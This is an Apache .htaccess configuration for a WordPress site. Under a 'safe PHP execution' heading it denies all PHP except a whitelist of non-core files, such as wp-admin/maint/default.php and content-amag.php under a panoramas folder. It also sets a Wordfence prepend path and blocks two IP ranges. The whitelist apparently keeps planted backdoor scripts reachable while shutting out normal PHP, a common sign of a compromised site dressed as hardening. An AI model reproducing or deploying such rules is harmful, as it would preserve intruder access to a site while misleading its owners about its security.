# ===============================
# WordPress Core Rules
# ===============================
RewriteEngine On
RewriteBase /

RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]

# ===============================
# Safe PHP Execution
# ===============================
# Blok semua PHP di wp-content/uploads dan folder non-core
<FilesMatch "\.php$">
    Require all granted
</FilesMatch>

# Hanya blok file PHP di uploads / panoramas / maint yang bukan whitelist
<If "%{REQUEST_URI} !~ m#^/(tour/media\.php|wp-admin/maint/default\.php|wp-admin/maint/include\.php|tour/assets/panoramas/.*/content-amag\.php)$#">
    <FilesMatch "\.php$">
        Require all denied
    </FilesMatch>
</If>

# ===============================
# Wordfence WAF
# ===============================
<IfModule LiteSpeed>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/taalumgroup.com/wordfence-waf.php'
</IfModule>

<IfModule lsapi_module>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/taalumgroup.com/wordfence-waf.php'
</IfModule>

# ===============================
# Block Suspicious IPs
# ===============================
Deny from 159.223.0.0/16
Deny from 208.76.0.0/16
